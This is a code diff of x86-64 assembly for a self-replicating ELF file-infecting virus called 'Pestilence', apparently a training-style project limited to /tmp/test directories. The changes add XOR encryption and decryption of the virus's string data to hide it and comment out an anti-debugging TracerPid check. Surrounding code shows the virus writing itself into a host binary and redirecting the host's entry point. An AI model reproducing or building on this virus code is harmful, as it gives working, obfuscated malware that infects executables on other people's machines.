@@ -147,6 +147,25 @@ section .text
         mov rbp, rsp
         sub rbp, Pestilence_size            ; allocate Pestilence struct on stack
 
+     .decrypt_data:   
+        ; Desencriptar data
+        lea r10, [rel __F_data]         ; base función
+        lea rbx, [rel xor_pass]   ; key
+        xor rcx, rcx              ; contador función
+        xor rdx, rdx              ; índice key
+
+    .decrypt_data_loop:
+        mov r8b, [r10 + rcx]
+        mov r9b, [rbx + rdx]
+        xor r8b, r9b
+        mov [r10 + rcx], r8b
+
+        inc rcx
+        inc rdx
+        and rdx, 7
+        cmp rcx, (__F_data__end - __F_data)
+        jl .decrypt_data_loop       
+
         ; load virus size
         lea rax, _start
         lea rbx, _finish
@@ -337,8 +356,8 @@ section .text
         jmp .jump_to_host
 
     .check_tracerPid_value:
-        cmp byte [rdi], 0x30 ; == "0"
-        jne .cleanup_and_jump_to_host_1
+       ; cmp byte [rdi], 0x30 ; == "0"
+       ; jne .cleanup_and_jump_to_host_1
 
     .close_status_file_and_infect:
         add rsp, 0x1000
@@ -589,6 +608,26 @@ section .text
         ; mov [rax+Elf64_Phdr.p_memsz], rcx               ; p_memsz = virus_size
         ; mov qword [rax+Elf64_Phdr.p_align], 0x1000      ; p_align = 0x1000 (4KB)
         CALL_ENCRYPT(mod_pt_note)
+
+        ; Encriptar data
+    .encrypt_data    
+        lea r10, [rel __F_data]         ; base función
+        lea rbx, [rel xor_pass]   ; key
+        xor rcx, rcx              ; contador función
+        xor rdx, rdx              ; índice key
+
+    .encrypt_data_loop:
+        mov r8b, [r10 + rcx]
+        mov r9b, [rbx + rdx]
+        xor r8b, r9b
+        mov [r10 + rcx], r8b
+
+        inc rcx
+        inc rdx
+        and rdx, 7
+        cmp rcx, (__F_data__end - __F_data)
+        jl .encrypt_data_loop       
+    
     .write_payload:
         lea rsi, _start
         mov rdi, VAR(Pestilence.mmap_ptr)
@@ -610,6 +649,8 @@ section .text
         mov rax, VAR(Pestilence.mmap_ptr)
         mov rbx, VAR(Pestilence.new_entry)
         mov [rax + Elf64_Ehdr.e_entry], rbx
+
+
 
     .munmap:
         ;munmap(map_ptr, len)
@@ -661,16 +702,18 @@ section .text
         xor rdi, rdi
         syscall
 
+    __F_data:
     tracerPid_str   db      0x54,0x72,0x61,0x63,0x65,0x72,0x50,0x69,0x64,0x3A,0x9  ;"TracerPid:",0x9 ; 11
     status_file     db      0x2F,0x70,0x72,0x6F,0x63,0x2F,0x73,0x65,0x6C,0x66,0x2F,0x73,0x74,0x61,0x74,0x75,0x73,0 ;"/proc/self/status",0 ; 18
-    xor_pass        db      0x70,0x33,0x73,0x74,0x31,0x6C,0x33,0x21 ;"p3st1l3!" ; 8
     forbidden_prog  db      0x2F,0x76,0x69,0x6D,0 ;"/vim",0  4
     exe_string      db      0x2F,0x65,0x78,0x65,0 ;"/exe",0 ; 5
     hello           db      "[+] hello",10,0 ;11
     proc            db      0x2F,0x70,0x72,0x6F,0x63,0x2f,0 ; "/proc/",0 ; 7
     dirs            db      0x2F,0x74,0x6D,0x70,0x2F,0x74,0x65,0x73,0x74,0,0x2F,0x74,0x6D,0x70,0x2F,0x74,0x65,0x73,0x74,0x32,0,0  ;"/tmp/test",0,"/tmp/test2",0,0
+    __F_data__end:
     Traza_position  equ     _finish - Traza
     Traza           db      "Pestilence version 1.0 (c)oded by tomartin & carce-bo",0  ;54
+    xor_pass        db      0x70,0x33,0x73,0x74,0x31,0x6C,0x33,0x21 ;"p3st1l3!" ; 8
     host_entrypoint dq      _dummy_host_entrypoint
     virus_vaddr     dq      _start
 
